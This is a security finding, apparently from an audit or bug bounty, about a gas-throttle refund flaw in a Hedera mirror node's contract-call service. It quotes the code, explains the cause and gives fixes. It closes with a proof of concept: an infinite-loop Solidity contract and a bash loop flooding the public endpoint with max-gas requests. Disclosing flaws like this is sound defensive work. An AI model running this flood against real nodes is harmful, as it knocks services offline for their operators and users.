### Title
Gas Throttle Bypass via Out-of-Gas Restoration Enables CPU Exhaustion DoS

### Summary
The `restoreGasToBucket` method in `ContractCallService` unconditionally restores the full gas limit back to the throttle bucket whenever a transaction fails with out-of-gas (`gasUsed == gasLimit`). With the default `gasLimitRefundPercent = 100`, an attacker targeting a contract with an infinite-loop fallback can send maximum-gas requests that exhaust the EVM each time, consuming maximum CPU per request, while the gas-based rate limiter is fully refunded after every request — leaving only the weaker `requestsPerSecond` limit as protection.

### Finding Description

**Exact code path:**

In `ContractController.call()`, the flow is:
1. `throttleManager.throttle(request)` — deducts `request.getGas()` tokens from the gas bucket.
2. `validateContractMaxGasLimit(request)` — only enforces `gas <= maxGasLimit` (default 15,000,000); no wall-clock or CPU time bound.
3. `contractExecutionService.processCall(params)` — runs the EVM synchronously until gas exhaustion.
4. Inside `doProcessCall` → `restoreGasToBucket` is called in the `finally` block.

The critical logic in `ContractCallService.restoreGasToBucket()`:

```java
// ContractCallService.java lines 140-151
private void restoreGasToBucket(EvmTransactionResult result, long gasLimit) {
    final var gasLimitToRestoreBaseline = (long) (gasLimit * throttleProperties.getGasLimitRefundPercent() / 100f);
    if (result == null || (!result.isSuccessful() && gasLimit == result.gasUsed())) {
        throttleManager.restore(gasLimitToRestoreBaseline);
    } else {
        final var gasRemaining = gasLimit - result.gasUsed();
        throttleManager.restore(Math.min(gasRemaining, gasLimitToRestoreBaseline));
    }
}
```

With `gasLimitRefundPercent = 100` (the default in `ThrottleProperties`):
- `gasLimitToRestoreBaseline = gasLimit * 100 / 100 = gasLimit`
- For an out-of-gas failure: `!result.isSuccessful() == true` AND `gasLimit == result.gasUsed() == true`
- Therefore: `throttleManager.restore(gasLimit)` — the **full gas is returned to the bucket**

**Root cause / failed assumption:** The design assumes that failed transactions should not permanently consume gas tokens (to avoid penalizing legitimate users for reverts). However, this assumption fails for out-of-gas failures caused by infinite-loop contracts: the CPU work was fully performed (the EVM ran until gas exhaustion), yet the gas cost is fully refunded to the throttle bucket, making the gas-based rate limiter a no-op for this attack class.

**Why existing checks fail:**
- `validateContractMaxGasLimit` only caps gas at 15M — it does not prevent the attack, it just bounds the per-request CPU cost.
- The gas throttle (`gasPerSecond = 7,500,000,000`) is fully bypassed because every out-of-gas request gets its gas restored.
- The only remaining guard is `requestsPerSecond = 500`, which still allows 500 × 15M = 7.5B gas-units of EVM computation per second — enough to saturate CPU on a typical server.
- There is no wall-clock execution timeout on `transactionExecutionService.execute()`.

### Impact Explanation

An attacker can continuously saturate the mirror node's thread pool with EVM executions running at maximum gas, each consuming significant CPU time (EVM interpretation of 15M gas can take hundreds of milliseconds). With 500 req/s allowed by the request-rate limiter, and each request consuming maximum CPU, the mirror node's CPU is exhausted. This starves background services (block ingestion, record file processing) that keep the mirror node synchronized with the Hedera network, causing the node to fall behind or become unable to serve any requests — effectively partitioning it from the network outside of design parameters. Severity: **High**.

### Likelihood Explanation

- **No privilege required**: The `/api/v1/contracts/call` endpoint is public and unauthenticated.
- **Contract precondition**: A contract with an infinite-loop fallback must exist on the target network. Such contracts are trivially deployable on any EVM-compatible network and commonly exist in the wild.
- **Scalability**: A single attacker with a modest number of concurrent HTTP connections can sustain 500 req/s. Multiple IPs can bypass any IP-level rate limiting at the load balancer.
- **Repeatability**: The attack is fully repeatable and automated with a simple script.

### Recommendation

1. **Do not restore gas for out-of-gas failures**: Change the condition in `restoreGasToBucket` so that out-of-gas results (`gasUsed == gasLimit`) do **not** trigger a full restore. Only restore genuinely unused gas (i.e., `gasLimit - gasUsed` for successful/reverted calls).
2. **Add a wall-clock execution timeout**: Wrap `transactionExecutionService.execute()` with a hard timeout (e.g., via `Future.get(timeout)` or a circuit breaker) so a single request cannot hold a thread for an unbounded duration.
3. **Reduce `gasLimitRefundPercent` default**: Setting it to a value like 25% would limit the refund even for legitimate reverts, reducing the attack surface.
4. **Add per-IP rate limiting** at the ingress/load-balancer layer independent of the gas throttle.

### Proof of Concept

**Step 1 — Deploy an infinite-loop contract** (or use an existing one on the target network):
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract InfiniteLoop {
    fallback() external payable {
        while (true) {}
    }
}
```
Note the deployed address, e.g., `0xDEADBEEF...`.

**Step 2 — Send flood of max-gas requests:**
```bash
while true; do
  curl -s -X POST https://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{
      "to": "0x000000000000000000000000DEADBEEF...",
      "gas": 15000000,
      "data": "0x",
      "estimate": false
    }' &
done
```

**Step 3 — Observe:**
- Each request runs the EVM until gas exhaustion (CPU-intensive).
- The gas throttle bucket is fully refilled after each request (out-of-gas restore path).
- Only the 500 req/s limit applies; at scale this saturates CPU.
- Mirror node background ingestion stalls; the node falls behind the network.

**Verification:** Monitor mirror node CPU (`top`/`htop`) and block ingestion lag metrics during the flood. CPU will spike to 100% and block processing latency will increase monotonically.
